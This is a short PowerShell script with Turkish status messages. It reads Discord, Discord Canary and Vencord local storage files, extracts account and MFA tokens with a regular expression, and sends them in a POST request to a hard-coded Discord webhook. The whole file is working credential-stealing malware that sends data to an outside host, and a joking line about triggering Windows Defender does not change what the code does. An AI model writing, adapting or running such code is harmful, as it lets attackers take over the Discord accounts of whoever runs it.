$paths = @(
    "$env:APPDATA\discord\Local Storage\leveldb",
    "$env:APPDATA\discordcanary\Local Storage\leveldb",
    "$env:APPDATA\Vencord\Local Storage\leveldb"
)

foreach ($path in $paths) {
    if (Test-Path $path) {
        Write-Host "[:fire:] Dizin bulundu: $path" -ForegroundColor Green
        $files = Get-ChildItem -Path $path -Include *.ldb, *.log -Recurse -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
            $matches = [regex]::Matches($content, '[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
            $tokens = @()
            foreach ($match in $matches) {
                $tokens += $match.Value
            }

            if ($tokens.Count -gt 0) {
                $joinedTokens = ($tokens -join ",")
                $body = @{
                    content = "ıdk just to trigger wndows defender lol $joinedTokens"
                } | ConvertTo-Json

                try {
                    Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1382366500777754786/sjFYA4Lh_9oTWZXM4L_ehRA7RagtJKDwxQ23xZT8-cUTYyQErTZWp-e977lclWd6PQX9" -Method Post -Body $body -ContentType "application/json"
                    Write-Host "[:outbox_tray:] POST atıldı: $joinedTokens" -ForegroundColor Cyan
                } catch {
                    Write-Host "[:broken_heart:] POST başarısız: $_" -ForegroundColor Red
                }
            }
        }
    }
}
pause
